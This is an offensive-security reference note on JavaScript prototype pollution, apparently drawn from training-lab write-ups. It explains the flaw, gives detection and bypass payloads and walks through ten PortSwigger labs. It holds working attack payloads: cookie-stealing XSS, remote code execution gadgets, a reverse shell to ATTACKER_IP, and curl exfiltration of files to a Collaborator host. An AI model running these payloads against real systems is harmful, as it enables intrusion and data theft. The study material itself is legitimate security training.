---
title: "Prototype Pollution"
type: technique
tags: [client-side, exploitation, h1, javascript, prototype-pollution, server-side, thm, web]
phase: exploitation
date_created: 2026-05-08
date_updated: 2026-05-13
sources: [thm-adv-prototype-pollution, h1-scraped-prototype-pollution, 0xdf-specialty-web, payloadsallthethings-prototype-pollution, git-portswigger-all-labs]
---

# Prototype Pollution

## What it is

Prototype pollution is a JavaScript vulnerability where an attacker can modify `Object.prototype` (or other base prototypes) by injecting properties through user-controlled input. Because all ordinary JavaScript objects inherit from `Object.prototype`, any property added to it becomes accessible on every object in the application, enabling privilege escalation, property override, and in many cases Remote Code Execution.

## How it works

In JavaScript, every object has an internal link to a prototype object. When accessing a property that does not exist on an object, JavaScript walks up the prototype chain. The key vectors are:

- **`__proto__`** — direct reference to the prototype of an object; setting `obj.__proto__.x = 1` poisons `Object.prototype`
- **`prototype`** — the prototype property of constructor functions: `Object.prototype.x = 1`
- **`constructor.prototype`** — alternate path: `obj.constructor.prototype.x = 1`

Vulnerable code patterns merge user-controlled JSON or query parameters into objects without validation:

```javascript
// Vulnerable recursive merge
function merge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object') {
            target[key] = merge(target[key] || {}, source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

// Attacker supplies:
merge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'));
// Now: ({}).isAdmin === true  for every new object
```

Similarly, `Object.assign` with deeply nested user input or `JSON.parse` of attacker-controlled data fed into merge utilities are common sinks.

## Prerequisites

**Client-side pollution:**
- Application uses client-side JavaScript that merges URL parameters, `localStorage`, or `postMessage` data into objects
- No input sanitisation that strips `__proto__`, `prototype`, or `constructor` keys

**Server-side pollution (PP2RCE):**
- Node.js application
- Vulnerable object merge / deep clone library (e.g., old versions of `lodash.merge`, `merge`, `jquery-extend`)
- A gadget chain exists in the application or its dependencies that reads from `Object.prototype` and executes code

## Methodology

1. **Detect** — inject `__proto__[testprop]=polluted` in URL parameters, JSON body, or form fields; then check if `{}['testprop'] === 'polluted'` in browser console or observe application behaviour change
2. **Identify the source** — determine where user-controlled data is merged (URL query params, JSON body, cookies, header values)
3. **Find gadgets** — look for code that reads properties from objects without `hasOwnProperty` checks, or libraries that use inherited properties to control execution flow
4. **Client-side XSS gadget** — pollute a property used by a DOM manipulation gadget to inject a script node
5. **Server-side RCE gadget** — pollute properties used by `child_process.spawn`, template engines, or `require` calls
6. **Craft payload** — encode the `__proto__` injection for the specific input format (query string, JSON, etc.)

### Manual Testing (ExpressJS & JSON padding)

- ExpressJS parameter pollution: `{"__proto__":{"parameterLimit":1}}`
- ExpressJS query prefix bypass: `{"__proto__":{"ignoreQueryPrefix":true}}` + `??foo=bar`
- ExpressJS allow dots: `{"__proto__":{"allowDots":true}}` + `?foo.bar=baz`
- JSON response padding: `{"__proto__":{"json spaces":" "}}` + `{"foo":"bar"}` returns formatted JSON `{"foo": "bar"}`
- CORS headers override: `{"__proto__":{"exposedHeaders":["foo"]}}`
- Status code manipulation: `{"__proto__":{"status":510}}`

### Detecting Server-Side Pollution Without Reflection

When the server does not echo polluted properties back in the response, use indirect oracle techniques:

1. Send a valid request — note the normal response structure.
2. Inject `"__proto__": {"status": 510}` (any value 400–599).
3. Intentionally break the JSON syntax (e.g., remove a trailing comma) to trigger a server error.
4. Observe the error response: if the `status` field equals your injected value (not the default 400), prototype pollution is confirmed.

This works because Express and similar frameworks read `status` from `Object.prototype` when constructing error objects.

## Key Payloads / Examples

### Detection payloads

URL query string:
```
?__proto__[testprop]=polluted
?__proto__.testprop=polluted
?constructor.prototype.testprop=polluted
```

### Bypassing flawed sanitization (non-recursive strip)

When a blocklist strips `__proto__` or `prototype` once but doesn't recurse:
```
/?__pro__proto__to__[foo]=bar
/?__pro__proto__to__.foo=bar
/?constconstructorructor[protoprototypetype][foo]=bar
/?constconstructorructor.protoprototypetype.foo=bar
```
The sanitiser removes the inner `__proto__` token, reconstructing the dangerous key.

### Bypassing `__proto__` filters via `constructor.prototype`

When `__proto__` is blocked server-side, use the constructor path in JSON:
```json
{
  "constructor": {
    "prototype": {
      "json spaces": 10
    }
  }
}
```
Confirm pollution: raw response JSON indentation increases to 10 spaces.

### Browser API gadget — `Object.defineProperty` value injection

When `transport_url` is defined via `Object.defineProperty` without a `value` attribute, it is unwritable but its `value` can be supplied via prototype pollution:
```
/?__proto__[value]=data:,alert(1);
```
The `value` property falls through to `Object.prototype`, satisfying the descriptor.

### URL fragment / hash as pollution source (third-party library)

Some libraries parse the URL fragment and merge it into objects:
```html
<script>
location="https://TARGET/#__proto__[hitCallback]=alert(document.cookie)"
</script>
```
URL-encode brackets when delivering to a victim via an exploit server:
```html
<script>
location="https://TARGET/#__proto__%5BhitCallback%5D=alert(document.cookie)"
</script>
```

### Server-side RCE via `execArgv` gadget (Node.js `child_process.fork`)

```json
{
  "__proto__": {
    "execArgv": [
      "--eval=require('child_process').execSync('curl https://COLLABORATOR-ID.oastify.com')"
    ]
  }
}
```
Trigger by invoking any admin action that spawns a child process (e.g., maintenance jobs).

### Server-side data exfiltration via `vim` shell gadget

```json
{
  "__proto__": {
    "shell": "vim",
    "input": ":! ls /home/carlos | base64 | curl -d @- https://COLLABORATOR-ID.oastify.com\n"
  }
}
```
Then to exfiltrate a file:
```json
{
  "__proto__": {
    "shell": "vim",
    "input": ":! cat /home/carlos/secret | base64 | curl -d @- https://COLLABORATOR-ID.oastify.com\n"
  }
}
```
`-d @-` tells curl to POST data read from stdin; base64 encoding survives HTTP transport.

JSON body:
```json
{"__proto__": {"testprop": "polluted"}}
{"constructor": {"prototype": {"testprop": "polluted"}}}
```

Browser console verification:
```javascript
console.log({}.testprop)  // should print "polluted" if pollution succeeded
```

### Client-side XSS via prototype pollution

If an application creates DOM elements using inherited properties:

```javascript
// Application code (gadget):
let options = {};
let tag = options.tag || 'div';
document.createElement(tag);

// Pollution payload:
Object.prototype.tag = "script";
// Combined with src property injection to load external script
```

### Overriding security checks

```javascript
// If application does: if (user.isAdmin) { ... }
// Polluting Object.prototype.isAdmin bypasses the check for any user object:
Object.prototype.isAdmin = true;
```

### Server-side pollution — Node.js shell via child_process gadget

Some versions of lodash.merge are vulnerable. Payload delivered as JSON:
```json
{
  "__proto__": {
    "shell": "node",
    "NODE_OPTIONS": "--require /proc/self/fd/0",
    "argv0": "process.mainModule.require('child_process').execSync('id > /tmp/pwn')"
  }
}
```

### Server-side pollution — RCE in Kibana (CVE-2019-7609)
```javascript
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/ATTACKER_IP/12345 0>&1");process.exit()//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```

### Server-side pollution — RCE via EJS Gadget
```json
{
    "__proto__": {
        "client": 1,
        "escapeFunction": "JSON.stringify; process.mainModule.require('child_process').exec('id | nc localhost 4444')"
    }
}
```

### Object.assign shallow copy (not vulnerable to deep pollution directly)

```javascript
// Safe — only copies own enumerable properties:
Object.assign({}, userInput);

// But a library that recurses into nested objects IS vulnerable:
deepMerge({}, userInput);
```

### JSON.parse pollution (indirect)

`JSON.parse` itself does not pollute, but if the result is fed into a vulnerable merge:
```javascript
const data = JSON.parse(req.body);  // {__proto__: {x: 1}}
merge(existingObject, data);         // now Object.prototype.x === 1
```

## Gadget Chains

A gadget is existing application code that reads a property from an object without `hasOwnProperty` and uses that value in a dangerous way. Common gadgets:

| Gadget type | What to pollute |
|-------------|-----------------|
| Template engines (Pug, Handlebars) | `__proto__.debug`, `__proto__.escape`, output function properties |
| `child_process.spawn` with env | `__proto__.env.NODE_OPTIONS` |
| Express `res.render` | Rendering-function related properties |
| jQuery `$.extend(true, ...)` | Nested merge sinks |
| Object property used in `eval` or `new Function` | Any property that ends up evaluated |

## Real-World Examples (HackerOne — paid reports)

No paid prototype-pollution reports in current H1 dataset (0 of 1,901 bounty reports). Prototype pollution is frequently reported but often as a low/informational finding without direct bounty; impact chains to XSS or RCE are where bounties appear.

## From the Wild — chained Node payloads (HTB, `0xdf-specialty-web`)

**Pollution (2023)** chains leaked Burp exports, forum impersonation into admin-only routes, XXE-fed **Redis**, **PHP-FPM fastcgi** shell upgrades, then an **Express** merge sink poisoning **`Object.prototype`** so **`child_process` gadgets** fire for elevated shells.

**Unobtainium** highlights Electron updater risk: unpacking **asar** artefacts exposes recursive merges honouring **`__proto__`** keys ending in shell primitives before Kubernetes takeover (coordinate with notes under [[kubernetes-attacks]]).

Replay merge-heavy routers locally, fuzz **`constructor.prototype`** when `__proto__` filters appear, and track dependency advisories surfaced by `npm audit` or Snyk in writeups like Pollution.

## Detection and Defence

| Issue | Fix |
|-------|-----|
| Merge without key sanitisation | Block or strip `__proto__`, `prototype`, `constructor` keys before merging |
| `JSON.parse` fed into recursive merge | Use a sanitising JSON parser or a safe merge that uses `Object.create(null)` as targets |
| `hasOwnProperty` not used in property checks | Use `Object.prototype.hasOwnProperty.call(obj, key)` instead of `obj.hasOwnProperty(key)` or `key in obj` |
| Pollutable base prototype | Use `Object.freeze(Object.prototype)` in Node.js apps |
| Outdated dependencies | Keep `lodash`, `merge`, `deep-assign` and similar libraries patched |

## Tools

- [[burp-suite]] — intercept JSON bodies and inject prototype pollution payloads
- **DOM Invader (Burp built-in browser)** — enable "Prototype pollution" option, reload page; identifies sources automatically, then click "Scan for gadgets" to find sinks; click "Exploit" to generate a PoC `alert()`
- Browser DevTools Console — verify pollution by checking `{}.property` after injection
- `yuske/server-side-prototype-pollution` — Server-Side Prototype Pollution gadgets
- `BlackFan/client-side-prototype-pollution` — Client-side scripts gadgets
- `yeswehack/pp-finder` — Help find gadgets for prototype pollution exploitation
- `msrkp/PPScan` — Client Side Prototype Pollution Scanner

### Manual gadget tracing in DevTools

When DOM Invader is unavailable, locate gadgets by injecting a `get` trap on the suspected property:
```javascript
Object.defineProperty(Object.prototype, 'YOUR-PROPERTY', {
  get() {
    console.trace();
    return 'polluted';
  }
});
```
Reload the page, watch the console for a stack trace, and follow it to the sink.

## Sources

- THM Prototype Pollution room (`https://tryhackme.com/room/prototypepollution`)
- `0xdf-specialty-web` — Pollution (Burp-history forum pivot, Redis, Express API PP), Unobtainium (Electron updater PP pipeline)

---

## PortSwigger Labs

### LAB 1 — Client-side prototype pollution via browser APIs (Practitioner)

**Vulnerability:** `Object.defineProperty()` used without a `value` attribute — property is unwritable but `value` can be injected via prototype.

1. Confirm source: `/?__proto__[foo]=bar` → check `Object.prototype` in DevTools console.
2. Locate gadget in `searchLoggerConfigurable.js`: `transport_url` is defined via `Object.defineProperty` without `value`.
3. Inject: `/?__proto__[value]=data:,alert(1);` — a `<script src="data:,alert(1);">` is appended to the DOM.

**DOM Invader shortcut:** Enable prototype pollution option → reload → Scan for gadgets → gadget `script.src` via `value` property → Exploit.

---

### LAB 2 — DOM XSS via client-side prototype pollution (Practitioner)

**Vulnerability:** `searchLoggerAlternative.js` passes `manager.sequence` to `eval()` with no default value.

1. `/?__proto__[foo]=bar` — `__proto__` bracket notation fails; try dot notation: `/?__proto__.foo=bar` — succeeds.
2. Gadget: `eval(manager.sequence)` — no `sequence` defined on the object.
3. Inject: `/?__proto__[transport_url]=data:,alert(1);` triggers XSS.

**DOM Invader:** Identifies `eval()` sink via `sequence` gadget; auto-PoC may need manual adjustment to call `alert(1)`.

---

### LAB 3 — DOM XSS via an alternative prototype pollution vector (Practitioner)

**Vulnerability:** `searchLogger.js` appends a script using `config.transport_url`; no default value set.

1. Confirm source: `/?__proto__[foo]=bar` → `Object.prototype` gains `foo`.
2. Inject: `/?__proto__[transport_url]=data:,alert(1);` → `<script src="data:,alert(1);">` rendered.

**DOM Invader:** Scans and identifies `script.src` sink via `transport_url` gadget → Exploit calls `alert(1)`.

---

### LAB 4 — Client-side prototype pollution via flawed sanitization (Practitioner)

**Vulnerability:** `sanitizeKey()` strips dangerous keys once but does not recurse — bypassed by nesting the blocked token inside itself.

1. Standard vectors blocked: `/?__proto__[foo]=bar`, `/?__proto__.foo=bar`, `/?constructor.prototype.foo=bar` all fail.
2. Bypass — embed the blocked string inside itself so stripping it reconstructs the key:
```
/?__pro__proto__to__[transport_url]=data:,alert(1);
/?__pro__proto__to__.foo=bar
/?constconstructorructor[protoprototypetype][foo]=bar
/?constconstructorructor.protoprototypetype.foo=bar
```
3. Gadget: `transport_url` in `searchLogger.js` — same as Lab 3.
4. Confirm: `/?__pro__proto__to__[transport_url]=data:,alert(1);` triggers `alert(1)`.

---

### LAB 5 — Client-side prototype pollution in third-party libraries (Practitioner)

**Vulnerability:** Third-party library parses the URL **fragment** (`#`) and merges it — `hash` is the source, not the query string.

1. DOM Invader detects two pollution vectors in the `hash` property.
2. Gadget: `setTimeout()` sink via `hitCallback` property.
3. Exploit server payload (URL-encode brackets for victim delivery):
```html
<script>
location="https://YOUR-LAB-ID.web-security-academy.net/#__proto__%5BhitCallback%5D=alert(document.cookie)"
</script>
```

---

### LAB 6 — Privilege escalation via server-side prototype pollution (Practitioner)

**Vulnerability:** `POST /my-account/change-address` merges JSON body into user object; response reflects inherited properties.

1. Confirm source: inject `"__proto__": {"foo": "bar"}` — response includes `foo` without a `__proto__` key (inheritance confirmed).
2. Identify gadget: response contains `"isAdmin": false`.
3. Exploit:
```json
{
  "__proto__": {
    "isAdmin": true
  }
}
```
4. Refresh browser — admin panel link appears; delete Carlos.

---

### LAB 7 — Detecting SSPP without polluted property reflection (Practitioner)

**Technique:** Use the `status` property oracle when the server does not echo polluted properties.

1. Inject `"__proto__": {"status": 510}` — normal response unchanged (no reflection).
2. Break JSON syntax (remove a comma) to force a 500 error.
3. Observe error body: `status` and `statusCode` now equal `510` (your injected value, not the default 400).
4. Pollution confirmed without any direct reflection.

---

### LAB 8 — Bypassing flawed input filters for server-side prototype pollution (Practitioner)

**Vulnerability:** Server blocks `__proto__` in JSON bodies but does not sanitize `constructor.prototype`.

1. `"__proto__": {"json spaces": 10}` — no effect (filtered).
2. Bypass via constructor path:
```json
{
  "constructor": {
    "prototype": {
      "json spaces": 10
    }
  }
}
```
3. Raw response now has 10-space indentation — pollution confirmed.
4. Escalate:
```json
{
  "constructor": {
    "prototype": {
      "isAdmin": true
    }
  }
}
```
5. Refresh — admin panel accessible; delete Carlos.

---

### LAB 9 — Remote code execution via server-side prototype pollution (Practitioner)

**Vulnerability:** Admin maintenance jobs spawn Node.js child processes via `child_process.fork`; `execArgv` is read from the prototype.

1. Confirm source: `"__proto__": {"json spaces": 10}` — indentation changes in response.
2. Inject `execArgv` gadget to prove RCE (Burp Collaborator):
```json
{
  "__proto__": {
    "execArgv": [
      "--eval=require('child_process').execSync('curl https://COLLABORATOR-ID.oastify.com')"
    ]
  }
}
```
3. Trigger: admin panel → Run maintenance jobs → DNS/HTTP hits in Collaborator confirm RCE.
4. Replace `curl` with `rm /home/carlos/morale.txt` to solve the lab.

---

### LAB 10 — Exfiltrating sensitive data via server-side prototype pollution (Expert)

**Vulnerability:** Same `child_process` gadget as Lab 9 but goal is data exfiltration rather than file deletion.

1. Confirm pollution with `"__proto__": {"json spaces": 10}`.
2. Confirm RCE with Collaborator ping:
```json
{
  "__proto__": {
    "shell": "vim",
    "input": ":! curl https://COLLABORATOR-ID.oastify.com\n"
  }
}
```
3. Trigger maintenance jobs — Collaborator receives HTTP interactions.
4. Leak directory listing:
```json
{
  "__proto__": {
    "shell": "vim",
    "input": ":! ls /home/carlos | base64 | curl -d @- https://COLLABORATOR-ID.oastify.com\n"
  }
}
```
Decode base64 body → reveals `node_apps` and `secret`.

5. Exfiltrate the secret:
```json
{
  "__proto__": {
    "shell": "vim",
    "input": ":! cat /home/carlos/secret | base64 | curl -d @- https://COLLABORATOR-ID.oastify.com\n"
  }
}
```
Decode base64 body → submit decoded value as the solution.

**Key technique:** `-d @-` pipes stdin to the curl POST body; base64 ensures binary-safe transport over HTTP.
